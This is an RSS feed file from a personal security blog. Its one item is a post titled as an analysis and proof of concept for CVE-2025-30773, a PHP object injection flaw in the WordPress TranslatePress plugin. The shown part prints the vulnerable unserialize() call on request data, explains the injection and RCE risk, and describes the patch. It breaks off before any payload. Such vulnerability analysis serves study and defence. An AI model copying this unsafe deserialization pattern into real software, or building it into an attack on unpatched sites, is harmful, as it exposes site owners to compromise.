<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Bui Van Y</title>
    <link>http://localhost:1313/</link>
    <description>Bui Van Y</description>
    <generator>Hugo 0.152.2 &amp; FixIt v0.4.0-alpha.3-20251121172518-6f99565f</generator>
    <language>en</language>
    <managingEditor>w41bu1@gmail.com (Bui Van Y)</managingEditor>
    <webMaster>w41bu1@gmail.com (Bui Van Y)</webMaster>
    <lastBuildDate>Sun, 23 Nov 2025 19:00:00 +0700</lastBuildDate>
    <atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>CVE-2025-30773 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-23-cve-2025-30773/</link>
      <pubDate>Sun, 23 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-23-cve-2025-30773/</guid>
      <category domain="http://localhost:1313/categories/cve-analyst/">CVE Analyst</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-23-cve-2025-30773/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability is a Deserialization of Untrusted Data issue in Cozmoslabs TranslatePress, which allows for Object Injection. This issue affects TranslatePress from n/a up to version 2.9.6.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-30773&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-30773&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.9.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.9.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Administrator&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/translatepress-multilingual/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress TranslatePress Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; – &lt;strong&gt;TranslatePress&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.9.6&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.9.7&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any other diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v2.9.6):&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;trp_update_database&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;current_user_can&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;apply_filters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;trp_update_database_capability&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;manage_options&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;stop_and_print_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Update&amp;ensp;aborted!&amp;ensp;Your&amp;ensp;user&amp;ensp;account&amp;ensp;doesn\&amp;#39;t&amp;ensp;have&amp;ensp;the&amp;ensp;capability&amp;ensp;to&amp;ensp;perform&amp;ensp;database&amp;ensp;updates.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;translatepress-multilingual&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$nonce&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;trp_updb_nonce&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_verify_nonce&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_text_field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;trp_updb_nonce&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tpupdatedatabase&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$nonce&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;stop_and_print_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Update&amp;ensp;aborted!&amp;ensp;Invalid&amp;ensp;nonce.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;translatepress-multilingual&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$extra_params&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;trp_updb_extra_params&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;base64_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sanitize_text_field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;trp_updb_extra_params&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here, &lt;strong&gt;&lt;code&gt;unserialize()&lt;/code&gt;&lt;/strong&gt; is called directly on user-supplied data (&lt;code&gt;$_REQUEST[&#39;trp_updb_extra_params&#39;]&lt;/code&gt; after HTML sanitization and Base64 decode). This creates a serious vulnerability:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Object Injection risk&lt;/strong&gt;: If an attacker provides a PHP object payload encoded in Base64, the decode + unserialize process can initialize a malicious object, leading to &lt;strong&gt;Object Injection&lt;/strong&gt; and potentially &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;No safety validation&lt;/strong&gt;: There is no data validation prior to calling &lt;code&gt;unserialize()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;No fallback mechanism&lt;/strong&gt;: If data is invalid or malicious, the system lacks graceful handling, increasing risk.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patch (v2.9.7):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-23-cve-2025-30773/diff.png&#34; title=&#34;Patch changes&#34; data-thumbnail=&#34;/posts/2025-11-23-cve-2025-30773/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Patch changes&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-23-cve-2025-30773/diff.png&#39; alt=&#34;Diff&#34; height=&#34;278&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch changes&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;unserialize()&lt;/code&gt; is replaced with &lt;code&gt;json_decode()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;By removing &lt;code&gt;unserialize()&lt;/code&gt;, the vulnerability surface is eliminated entirely.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;code&gt;trp_update_database()&lt;/code&gt; function checks whether the current user is an Administrator via:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;current_user_can&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;apply_filters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;trp_update_database_capability&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;manage_options&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;stop_and_print_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Update&amp;ensp;aborted!&amp;ensp;Your&amp;ensp;user&amp;ensp;account&amp;ensp;doesn\&amp;#39;t&amp;ensp;have&amp;ensp;the&amp;ensp;capability&amp;ensp;to&amp;ensp;perform&amp;ensp;database&amp;ensp;updates.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;translatepress-multilingual&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It also verifies a &lt;code&gt;nonce&lt;/code&gt; to prevent CSRF:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$nonce&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;trp_updb_nonce&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_verify_nonce&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_text_field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;trp_updb_nonce&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tpupdatedatabase&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$nonce&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;stop_and_print_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Update&amp;ensp;aborted!&amp;ensp;Invalid&amp;ensp;nonce.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;translatepress-multilingual&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span 